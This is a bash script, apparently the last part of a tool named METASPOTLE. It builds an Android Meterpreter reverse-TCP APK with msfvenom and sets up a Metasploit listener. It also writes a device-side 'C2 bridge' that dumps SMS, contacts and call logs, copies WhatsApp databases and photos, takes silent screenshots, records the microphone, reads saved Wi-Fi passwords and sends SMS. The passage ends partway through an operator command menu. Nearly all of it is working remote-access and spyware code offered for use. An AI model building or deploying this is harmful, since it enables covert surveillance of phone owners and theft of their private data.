#!/bin/bash

#===============================================================================
# METASPOTLE - PART 3/3 - Android Control APK, About, Main Menu
#===============================================================================

#======= ANDROID FULL CONTROL APK =======
android_control_apk() {
  clear; banner
  echo -e "${MAGENTA}╔═════════════════════════════════════════════╗${NC}"
  echo -e "${MAGENTA}║    ${WHITE}ANDROID FULL CONTROL APK ENGINE${MAGENTA}      ║${NC}"
  echo -e "${MAGENTA}╚═════════════════════════════════════════════╝${NC}"
  echo ""
  get_lhost_lport
  echo -e "${GREEN}[*] Building Android Control APK with C2 Bridge...${NC}"
  echo -e "${YELLOW}[!] After install: 40+ device control functions${NC}"
  echo ""
  
  WORKDIR="$TOOL_DIR/android_control_$(date +%s)"
  mkdir -p "$WORKDIR"
  FILENAME="DroidControl_$(date +%s).apk"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  
  echo -e "${YELLOW}[1/4] Generating Meterpreter core...${NC}"
  BASE_APK="$WORKDIR/base.apk"
  msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > "$BASE_APK" 2>/dev/null
  if [ ! -f "$BASE_APK" ] || [ ! -s "$BASE_APK" ]; then
    echo -e "${RED}[FAIL]${NC}"; rm -rf "$WORKDIR"
    read -p "$(echo -e ${DIM}"Press [Enter]...")"; return
  fi
  
  echo -e "${YELLOW}[2/4] Building C2 bridge (40+ commands)...${NC}"
  C2_SCRIPT="$WORKDIR/c2_bridge.sh"
  cat > "$C2_SCRIPT" << 'C2EOF'
#!/system/bin/sh
# DROIDCONTROL C2 BRIDGE
cmd_info(){ echo "Model:$(getprop ro.product.model) OS:$(getprop ro.build.version.release) Bat:$(dumpsys battery|grep level|awk '{print $2}')% IP:$(ip addr show wlan0|grep 'inet '|awk '{print $2}')"; }
cmd_screenshot(){ /system/bin/screencap -p /data/local/tmp/screen.png; echo "Saved"; }
cmd_screenrecord(){ /system/bin/screenrecord --time-limit ${1:-30} /data/local/tmp/screenrecord.mp4; echo "Recorded ${1:-30}s"; }
cmd_anon_screenshot(){ /system/bin/screencap -p /data/local/tmp/.hidden_screen.png; echo "Silent"; }
cmd_list_apps(){ pm list packages -f 2>/dev/null|head -100; }
cmd_install_apk(){ pm install -r "$1" 2>/dev/null; echo "Result: $?"; }
cmd_uninstall_app(){ pm uninstall "$1" 2>/dev/null; echo "Result: $?"; }
cmd_force_stop(){ am force-stop "$1" 2>/dev/null; echo "Stopped: $1"; }
cmd_clear_data(){ pm clear "$1" 2>/dev/null; echo "Cleared: $1"; }
cmd_grant_perm(){ pm grant "$1" "$2" 2>/dev/null; echo "Granted $2"; }
cmd_ls(){ find "$1" -type f 2>/dev/null|head -50; }
cmd_sms(){ service call isms 7 i32 0 s16 "com.android.mms" s16 "$1" s16 "null" s16 "$2" s16 "null" s16 "null" 2>/dev/null; echo "Sent to $1"; }
cmd_dump_sms(){ content query --uri content://sms/inbox 2>/dev/null|head -100; }
cmd_dump_contacts(){ content query --uri content://contacts/phones/ 2>/dev/null|head -100; }
cmd_dump_calllog(){ content query --uri content://call_log/calls 2>/dev/null|head -100; }
cmd_whatsapp(){ cp -r /sdcard/Android/media/com.whatsapp/WhatsApp /data/local/tmp/wa/ 2>/dev/null; cp -r /data/data/com.whatsapp/databases /data/local/tmp/wa_db/ 2>/dev/null; echo "Done"; }
cmd_copy_screenshots(){ mkdir -p /data/local/tmp/screenshots; find /sdcard -name "Screenshot*" -o -name "screenshot*" 2>/dev/null|head -50|while read f;do cp "$f" /data/local/tmp/screenshots/;done; echo "Done"; }
cmd_copy_photos(){ mkdir -p /data/local/tmp/photos; find /sdcard/DCIM -name "*.jpg" -o -name "*.jpeg" -o -name "*.png" 2>/dev/null|head -50|while read f;do cp "$f" /data/local/tmp/photos/;done; echo "Done"; }
cmd_record_mic(){ tinycap /data/local/tmp/mic.wav -D 0 -d 0 -r 44100 -b 16 -c 2 -T ${1:-10} 2>/dev/null; echo "Recorded ${1:-10}s"; }
cmd_record_device_audio(){ screenrecord --time-limit ${1:-10} --audio-source=mic /data/local/tmp/device_audio.mp4 2>/dev/null; echo "Done"; }
cmd_open_url(){ am start -a android.intent.action.VIEW -d "$1" 2>/dev/null; echo "Opened"; }
cmd_play_audio(){ am start -a android.intent.action.VIEW -d "file://$1" -t "audio/*" 2>/dev/null; echo "Playing"; }
cmd_play_video(){ am start -a android.intent.action.VIEW -d "file://$1" -t "video/*" 2>/dev/null; echo "Playing"; }
cmd_display_photo(){ am start -a android.intent.action.VIEW -d "file://$1" -t "image/*" 2>/dev/null; echo "Displaying"; }
cmd_shell(){ echo "Interactive shell. Type exit."; sh; }
cmd_wifi(){ dumpsys wifi 2>/dev/null|grep -E "SSID|signal|IP|state|frequency"|head -15; }
cmd_saved_wifi(){ cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null||echo "Root required"; }
cmd_net_scan(){ ip neigh 2>/dev/null; cat /proc/net/arp 2>/dev/null; }
cmd_ping(){ ping -c 4 "$1" 2>/dev/null; }
cmd_battery(){ dumpsys battery 2>/dev/null; }
cmd_lock(){ input keyevent 26 2>/dev/null; echo "Locked"; }
cmd_unlock(){ input keyevent 82 2>/dev/null; echo "Wake attempted"; }
cmd_restart(){ reboot 2>/dev/null||echo "Root required"; }
cmd_keycode(){ input keyevent ${1:-26} 2>/dev/null; echo "Sent key $1"; }
cmd_locale(){ getprop persist.sys.locale; getprop ro.product.locale; }
cmd_extract_apk(){ pm path "$1" 2>/dev/null|cut -d: -f2|while read p;do cp "$p" /data/local/tmp/${1}.apk;done; echo "Extracted"; }
cmd_help(){
  echo "=== COMMANDS ==="
  echo "info screenshot screenrecord [s] anon_screenshot list_apps"
  echo "install_apk uninstall_app force_stop clear_data grant_perm"
  echo "ls whatsapp copy_screenshots copy_photos"
  echo "sms dump_sms dump_contacts dump_calllog"
  echo "record_mic [s] record_device_audio [s]"
  echo "open_url play_audio play_video display_photo"
  echo "shell wifi saved_wifi net_scan ping battery"
  echo "lock unlock restart keycode locale extract_apk"
}
case "$1" in
  info|screenshot|anon_screenshot|list_apps|dump_sms|dump_contacts|dump_calllog|whatsapp|copy_screenshots|copy_photos|shell|wifi|saved_wifi|net_scan|battery|lock|unlock|restart|locale|help) "cmd_$1" ;;
  screenrecord|record_mic|record_device_audio|ping) "cmd_$1" "$2" ;;
  install_apk|uninstall_app|force_stop|clear_data|ls|open_url|play_audio|play_video|display_photo|keycode|extract_apk) "cmd_$1" "$2" ;;
  sms|grant_perm) "cmd_$1" "$2" "$3" ;;
  *) cmd_help ;;
esac
C2EOF
  sed -i "s/__LHOST__/$LHOST/g; s/__LPORT__/$LPORT/g" "$C2_SCRIPT"
  
  echo -e "${YELLOW}[3/4] Creating listener resource...${NC}"
  RC_FILE="$WORKDIR/control.rc"
  cat > "$RC_FILE" << EOF
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set SessionTimeout 0
set WaitForSession true
exploit -j -z
EOF

  echo -e "${YELLOW}[4/4] Creating C2 command center...${NC}"
  CONTROL_HELPER="$PAYLOAD_DIR/droidcontrol_helper.sh"
  cat > "$CONTROL_HELPER" << 'HELPEREOF'
#!/bin/bash
SESSION=${1:-1}
while true; do
  clear
  echo "╔══════════════════════════════════════════════════╗"
  echo "║         DROIDCONTROL - COMMAND CENTER           ║"
  echo "╠══════════════════════════════════════════════════╣"
  echo "║ Session: $SESSION                                  ║"
  echo "╚══════════════════════════════════════════════════╝"
  echo ""
  echo "  [1]  Device Info        [13] WiFi Status"
  echo "  [2]  Screenshot         [14] Saved WiFi"
  echo "  [3]  Screen Record 30s  [15] Network Scan"
  echo "  [4]  Silent Screenshot  [16] Ping Test"
  echo "  [5]  List Apps          [17] Open Shell"
  echo "  [6]  Dump SMS           [18] Lock Device"
  echo "  [7]  Dump Contacts      [19] Unlock Device"
  echo "  [8]  Dump Call Log      [20] Restart Device"
  echo "  [9]  Copy WhatsApp      [21] Send SMS"
  echo "  [10] Copy Screenshots   [22] Open URL"
  echo "  [11] Copy Photos        [23] Record Mic 10s"
  echo "  [12] Battery Info       [24] Install APK"
  echo ""
  echo "  [0]  Exit"
